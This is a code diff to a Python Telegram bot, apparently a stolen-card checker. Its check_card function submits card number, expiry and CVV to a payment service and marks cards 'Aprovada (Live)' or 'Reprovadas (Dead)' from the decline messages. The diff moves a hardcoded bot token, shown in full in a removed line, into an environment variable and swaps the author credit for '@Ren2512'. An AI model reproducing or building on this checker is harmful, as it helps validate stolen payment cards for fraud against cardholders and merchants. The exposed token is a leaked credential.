@@ -1,12 +1,13 @@
 import telebot
+import os
 import requests
 import re
 from flask import Flask, request
 
-# အကို့ရဲ့ Token အမှန်ကို တိုက်ရိုက် ထည့်သွင်းထားပါသည်
-BOT_TOKEN = "8959049503:AAEy5eeX2MnnbU6Wp0Ts7uDKcAmb0eqwq4U"
+# Token ကို ဖွက်ထားပြီး Vercel Environment Variables မှတဆင့်သာ ယူပါမည်
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
 
-# Vercel တွင် အလုပ်လုပ်ရန် အရေးကြီးဆုံးအချက် (threaded=False)
+# Vercel တွင် အလုပ်လုပ်ရန် threaded=False ထည့်ထားရမည်
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML", threaded=False)
 app = Flask(__name__)
 
@@ -56,15 +57,15 @@ def check_card(cc, mes, ano, cvv):
         charge_res = req_charge.text
 
         if "Your card's security code is incorrect." in charge_res or "Your card's security code is incorrect." in token_res:
-            return f"🟢 <b>#Aprovada (Live)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> ♛𝕋𝕙𝕖 𝕋𝕖𝕔𝕙ℝ𝕚𝕞♛"
+            return f"🟢 <b>#Aprovada (Live)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> @Ren2512"
         elif "incorrect_number" in token_res or "Your card number is incorrect." in charge_res:
-            return f"🔴 <b>#Reprovadas (Invalid)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> ♛𝕋𝕙𝕖 𝕋𝕖𝕔𝕙ℝ𝕚𝕞♛"
+            return f"🔴 <b>#Reprovadas (Invalid)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> @Ren2512"
         elif "Your card does not support this type of purchase." in token_res or "Your card does not support this type of purchase." in charge_res:
-            return f"🔴 <b>#Reprovadas (Blocked)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> ♛𝕋𝕙𝕖 𝕋𝕖𝕔𝕙ℝ𝕚𝕞♛"
+            return f"🔴 <b>#Reprovadas (Blocked)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> @Ren2512"
         elif "Your card was declined." in charge_res or "Your card was declined." in token_res:
-            return f"🔴 <b>#Reprovadas (Dead)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> ♛𝕋𝕙𝕖 𝕋𝕖𝕔𝕙ℝ𝕚𝕞♛"
+            return f"🔴 <b>#Reprovadas (Dead)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> @Ren2512"
         else:
-            return f"🔴 <b>#Reprovadas (Unknown)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> ♛𝕋𝕙𝕖 𝕋𝕖𝕔𝕙ℝ𝕚𝕞♛"
+            return f"🔴 <b>#Reprovadas (Unknown)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_text}\n<b>By:</b> @Ren2512"
 
     except Exception as e:
         return f"⚠️ <b>Error Check:</b> {e}"
